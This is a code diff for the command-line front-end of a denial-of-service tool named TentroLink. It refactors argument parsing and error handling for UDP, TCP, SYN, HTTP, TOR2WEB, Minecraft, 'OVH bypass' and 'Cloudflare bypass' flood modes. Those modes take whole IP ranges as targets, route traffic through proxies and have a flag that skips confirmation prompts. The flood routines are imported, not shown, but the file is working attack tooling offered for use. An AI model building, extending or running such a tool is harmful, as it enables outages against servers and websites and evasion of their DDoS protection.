@@ -11,18 +11,68 @@ import textwrap
 import ipaddress
 import shutil
 import signal
+import asyncio
 from assets.utilities import Style, UI, AttackModule, validate_target
 from assets.methods import (
     UDPFlooder,
     TCPFlooder,
-    HTTPFlooder,
     TOR2WebFlooder
 )
+from assets.http_methods import HTTPFlooder
 from assets.syn_method import SYNFlooder
 from assets.minecraft_methods import MinecraftFlooder
 from assets.layer7 import OVHFlooder, CloudflareBypass
 
-__version__ = "0.5.2"
+__version__ = "0.6.0"
+
+def create_base_parser() -> argparse.ArgumentParser:
+    """Create the base parser with global options"""
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument('--version', action='version', 
+                       version=f'TentroLink v{__version__}')
+    parser.add_argument('--no-color', action='store_true',
+                       help='Disable colored output')
+    parser.add_argument('-v', '--verbose', action='store_true',
+                       help='Enable verbose output')
+    parser.add_argument('--proxy', type=str,
+                       help='Use proxies (file path or "auto")')
+    parser.add_argument('--proxy-threads', type=int, default=10,
+                       help='Number of threads for proxy validation (default: 10)')
+    parser.add_argument('-y', '--yes', action='store_true',
+                       help='Skip all confirmation prompts')
+    return parser
+
+def create_common_args_group(parser: argparse.ArgumentParser) -> argparse._ArgumentGroup:
+    """Create an argument group for common attack options"""
+    group = parser.add_argument_group('Common Options')
+    group.add_argument('-t', '--targets', required=True,
+                      help='''Target specification. Supports:
+                      - Single IP (e.g., 192.168.1.1)
+                      - Multiple IPs (e.g., 192.168.1.1,192.168.1.2)
+                      - CIDR notation (e.g., 192.168.1.0/24)
+                      - IP range (e.g., 192.168.1.1-192.168.1.10)''')
+    group.add_argument('-p', '--ports', required=False,
+                      help='''Port specification (optional). Supports:
+                      - Single port (e.g., 80)
+                      - Multiple ports (e.g., 80,443)
+                      - Port range (e.g., 80-100)
+                      - Service names (e.g., http,https,dns)
+                      Default: method-specific ports''')
+    group.add_argument('-d', '--duration', type=int, default=60,
+                      help='Duration of the attack in seconds (default: 60)')
+    group.add_argument('-T', '--threads', type=int, default=5,
+                      help='Number of threads per target/port combination (default: 5)')
+    return group
+
+def create_http_args_group(parser: argparse.ArgumentParser) -> argparse._ArgumentGroup:
+    """Create an argument group for HTTP-specific options"""
+    group = parser.add_argument_group('HTTP Options')
+    group.add_argument('--method', choices=['GET', 'POST', 'HEAD'],
+                      default='GET',
+                      help='HTTP request method (default: GET)')
+    group.add_argument('--path', default='/',
+                      help='URL path for requests (default: /)')
+    return group
 
 # Target handling and validation
 class TargetManager:
@@ -164,19 +214,7 @@ def main():
     UI.print_banner()
     
     # Create the base parser for global options
-    base_parser = argparse.ArgumentParser(add_help=False)
-    base_parser.add_argument('--version', action='version', 
-                           version=f'TentroLink v{__version__}')
-    base_parser.add_argument('--no-color', action='store_true', 
-                           help='Disable colored output')
-    base_parser.add_argument('-v', '--verbose', action='store_true',
-                           help='Enable verbose output')
-    base_parser.add_argument('--proxy', type=str,
-                           help='Use proxies (file path or "auto")')
-    base_parser.add_argument('--proxy-threads', type=int, default=10,
-                           help='Number of threads for proxy validation (default: 10)')
-    base_parser.add_argument('-y', '--yes', action='store_true',
-                           help='Skip all confirmation prompts')
+    base_parser = create_base_parser()
     
     # Create the main parser that inherits from base_parser
     parser = argparse.ArgumentParser(
@@ -226,138 +264,59 @@ def main():
         help='UDP flood operation',
         description='Launch a UDP flood attack against specified targets and ports',
         parents=[base_parser])  # Include global options
-    udp_parser.add_argument('-t', '--targets', required=True,
-                           help='''Target specification. Supports:
-                           - Single IP (e.g., 192.168.1.1)
-                           - Multiple IPs (e.g., 192.168.1.1,192.168.1.2)
-                           - CIDR notation (e.g., 192.168.1.0/24)
-                           - IP range (e.g., 192.168.1.1-192.168.1.10)''')
-    udp_parser.add_argument('-p', '--ports', required=False,
-                           help='''Port specification (optional). Supports:
-                           - Single port (e.g., 80)
-                           - Multiple ports (e.g., 80,443)
-                           - Port range (e.g., 80-100)
-                           - Service names (e.g., http,https,dns)
-                           Default: method-specific ports''')
-    udp_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    udp_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target/port combination (default: 5)')
+    create_common_args_group(udp_parser)
     
     # SYN Flood parser
     syn_parser = subparsers.add_parser('syn',
         help='SYN flood operation',
         description='Launch a TCP SYN flood attack against specified targets',
         parents=[base_parser])  # Include global options
-    syn_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    syn_parser.add_argument('-p', '--ports', required=False,
-                           help='''Port specification (optional). Supports:
-                           - Single port (e.g., 80)
-                           - Multiple ports (e.g., 80,443)
-                           - Port range (e.g., 80-100)
-                           - Service names (e.g., http,https,dns)
-                           Default: method-specific ports''')
-    syn_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    syn_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target/port combination (default: 5)')
+    create_common_args_group(syn_parser)
     
     # HTTP Flood parser with fixed help text
     http_parser = subparsers.add_parser('http',
         help='HTTP flood operation',
         description='Launch an HTTP flood attack against web servers',
         parents=[base_parser])  # Include global options
-    http_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    http_parser.add_argument('-p', '--ports', required=False,
-                           help='''Port specification (optional). Supports:
-                           - Single port (e.g., 80)
-                           - Multiple ports (e.g., 80,443)
-                           - Port range (e.g., 80-100)
-                           - Service names (e.g., http,https,dns)
-                           Default: method-specific ports''')
-    http_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    http_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target/port combination (default: 5)')
-    http_parser.add_argument('--method', choices=['GET', 'POST', 'HEAD'],
-                           default='GET',
-                           help='HTTP request method (default: GET)')
-    http_parser.add_argument('--path', default='/',
-                           help='URL path for HTTP requests (default: /)')
+    create_common_args_group(http_parser)
+    create_http_args_group(http_parser)
 
     # Add TCP Flood parser
     tcp_parser = subparsers.add_parser('tcp',
         help='TCP flood operation',
         description='Launch a TCP flood attack against specified targets',
         parents=[base_parser])
-    tcp_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    tcp_parser.add_argument('-p', '--ports', required=False,
-                           help='Port specification (optional, default: 80,443)')
-    tcp_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    tcp_parser.add_argument('-T', '--threads', type=int, default=10,
-                           help='Number of threads per target/port combination (default: 10)')
+    create_common_args_group(tcp_parser)
 
     # Add TOR2WEB parser
     tor2web_parser = subparsers.add_parser('tor2web',
         help='TOR2WEB flood operation',
         description='Launch a flood attack through TOR2WEB gateways',
         parents=[base_parser])
-    tor2web_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    tor2web_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    tor2web_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target (default: 5)')
+    create_common_args_group(tor2web_parser)  # Using common args
 
     # Add Minecraft parser
     minecraft_parser = subparsers.add_parser('minecraft',
         help='Minecraft server flood operation',
         description='Launch a Minecraft protocol flood attack against servers',
         parents=[base_parser])
-    minecraft_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    minecraft_parser.add_argument('-p', '--ports', required=False,
-                           help='Port specification (default: 25565)')
-    minecraft_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    minecraft_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target (default: 5)')
+    create_common_args_group(minecraft_parser)  # Using common args
 
     # Add OVH parser
     ovh_parser = subparsers.add_parser('ovh',
         help='OVH bypass flood operation',
         description='Launch a flood attack with OVH bypass',
         parents=[base_parser])
-    ovh_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    ovh_parser.add_argument('-p', '--ports', required=False,
-                           help='Port specification (default: 80,443)')
-    ovh_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    ovh_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target (default: 5)')
-    ovh_parser.add_argument('--path', default='/',
-                           help='URL path for requests (default: /)')
+    create_common_args_group(ovh_parser)  # Using common args
+    create_http_args_group(ovh_parser)  # Add HTTP options for OVH
 
     # Add Cloudflare parser
     cf_parser = subparsers.add_parser('cloudflare',
         help='Cloudflare bypass flood operation',
         description='Launch a flood attack with Cloudflare bypass',
         parents=[base_parser])
-    cf_parser.add_argument('-t', '--targets', required=True,
-                           help='Target specification (same format as UDP flood)')
-    cf_parser.add_argument('-p', '--ports', required=False,
-                           help='Port specification (default: 80,443)')
-    cf_parser.add_argument('-d', '--duration', type=int, default=60,
-                           help='Duration of the attack in seconds (default: 60)')
-    cf_parser.add_argument('-T', '--threads', type=int, default=5,
-                           help='Number of threads per target (default: 5)')
-    cf_parser.add_argument('--path', default='/',
-                           help='URL path for requests (default: /)')
+    create_common_args_group(cf_parser)  # Using common args
+    create_http_args_group(cf_parser)  # Add HTTP options for Cloudflare
 
     # Parse arguments
     args = parser.parse_args()
@@ -452,15 +411,24 @@ def main():
             )
             active_flooder.start()
         elif args.command == 'tcp':
-            active_flooder = TCPFlooder(
-                targets=targets,
-                ports=ports,
-                duration=args.duration,
-                threads=args.threads,
-                proxy_manager=proxy_manager,
-                skip_prompt=args.yes
-            )
-            active_flooder.start()
+            try:
+                active_flooder = TCPFlooder(
+                    targets=targets,
+                    ports=ports,
+                    duration=args.duration,
+                    threads=args.threads,
+                    proxy_manager=proxy_manager,
+                    skip_prompt=args.yes,
+                    debug=args.verbose  # Add debug flag
+                )
+                # Ensure monitor thread is started properly
+                active_flooder.start()
+            except Exception as e:
+                UI.print_error(f"Error starting TCP flood: {e}")
+                if args.verbose:
+                    import traceback
+                    traceback.print_exc()
+                sys.exit(1)
         elif args.command == 'syn':
             active_flooder = SYNFlooder(
                 targets=targets,
@@ -494,16 +462,31 @@ def main():
             )
             active_flooder.start()
         elif args.command == 'minecraft':
-            from assets.minecraft_methods import MinecraftFlooder
-            active_flooder = MinecraftFlooder(
-                targets=targets,
-                ports=ports if ports else [25565],  # Use 25565 as default
-                duration=args.duration,
-                threads=args.threads,
-                debug=args.verbose,
-                skip_prompt=args.yes
-            )
-            active_flooder.start()
+            try:
+                from assets.minecraft_methods import MinecraftFlooder
+                active_flooder = MinecraftFlooder(
+                    targets=targets,
+                    ports=ports if ports else [25565],
+                    duration=args.duration,
+                    threads=args.threads,
+                    debug=args.verbose,
+                    skip_prompt=args.yes
+                )
+                try:
+                    asyncio.run(active_flooder.start())
+                except KeyboardInterrupt:
+                    asyncio.run(active_flooder.stop())  # Properly await stop
+                    sys.exit(0)
+                except Exception as e:
+                    if args.verbose:
+                        UI.print_error(f"Minecraft flood error: {str(e)}")
+                    sys.exit(1)
+            except Exception as e:
+                UI.print_error(f"Failed to start Minecraft flood: {str(e)}")
+                if args.verbose:
+                    import traceback
+                    traceback.print_exc()
+                sys.exit(1)
         elif args.command == 'ovh':
             active_flooder = OVHFlooder(
                 targets=targets,
@@ -528,7 +511,10 @@ def main():
             active_flooder.start()
     except KeyboardInterrupt:
         if active_flooder:
-            active_flooder.stop()
+            if hasattr(active_flooder, "stop_now"):
+                active_flooder.stop_now()
+            else:
+                active_flooder.stop()
         sys.exit(0)
 
     # Start showing stats
